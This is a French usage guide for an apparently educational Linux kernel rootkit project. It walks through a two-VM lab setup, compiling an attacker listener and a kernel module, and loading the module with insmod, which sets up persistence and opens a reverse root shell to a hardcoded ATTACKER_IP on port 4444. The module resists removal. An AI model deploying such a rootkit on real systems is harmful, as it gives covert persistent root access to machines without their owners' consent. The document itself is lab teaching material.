---
id: usage
title: Utilisation
sidebar_position: 8
---

# Guide d'Utilisation

:::info Prérequis
Arch Linux sur l'hôte physique, CPU avec virtualisation activée (VT-x/AMD-V), Ansible installé (`sudo pacman -S ansible`), minimum 8 Go de RAM libre et 50 Go de disque.
:::

## Étape 0 — Déploiement de l'infrastructure

### 1. Cloner et lancer le playbook

```bash
# Depuis l'hôte Arch Linux
ansible-playbook -i inventory.ini playbook.yml --ask-become-pass
```

Le playbook installe QEMU/KVM, télécharge Debian 12, crée et configure les deux VMs automatiquement. Durée estimée : 10-20 minutes selon la connexion.

### 2. Vérifier les VMs

```bash
virsh list --all
# Attendu :
# debian-vm-1   running
# debian-vm-2   running
```

## Étape 1 — Machine Attaquante (192.168.122.101)

### 1. Se connecter et compiler

```bash
ssh debian@192.168.122.101
sudo apt update && sudo apt install -y gcc make
cd ~/wlkom/attacking_program
make
```

### 2. Lancer l'écoute

```bash
./attacker
# [*] En attente d'une connexion interactive sur le port 4444...
```

Le programme attend la connexion entrante de la victime. Laisser ce terminal ouvert.

## Étape 2 — Machine Victime (192.168.122.102)

### 1. Installer les dépendances

```bash
ssh debian@192.168.122.102
sudo apt update && sudo apt install -y gcc make python3 linux-headers-$(uname -r)
```

### 2. Compiler le module

```bash
cd ~/wlkom/rootkit
make
# Produit : wlkom.ko
```

### 3. Activer le rootkit

```bash
sudo insmod wlkom.ko
# Charge le module, configure la persistance et déclenche la connexion immédiate vers l'attaquant
```

Sur la machine attaquante, la console va demander le mot de passe avant de passer en mode shell interactif de la victime :

```text
[!] VICTIME CONNECTÉE.
Password:
[*] Utilisez 'exit' pour quitter.

root@debian-vm-2:/#
```

## Désinstallation propre

```bash
# Sur la machine victime
cd ~/wlkom/rootkit
sudo make uninstall   # tente de retirer le module et désactive la persistance
sudo reboot           # OBLIGATOIRE pour décharger complètement le module de la mémoire
```

Le reboot est indispensable car `rmmod` est impossible : `try_module_get()` a verrouillé le compteur de référence du module. Seul un redémarrage efface la mémoire noyau.

## Modifier la configuration

**Changer l'IP de l'attaquant**

Deux fichiers contiennent l'IP hardcodée à modifier avant compilation :

```c
# rootkit/wlkom.c — ligne 19
#define ATTACKER_IP "192.168.122.101"

# attacking_program/victim_userland.c — ligne 5
#define ATTACKER_IP "127.0.0.1"  // ← à adapter
```
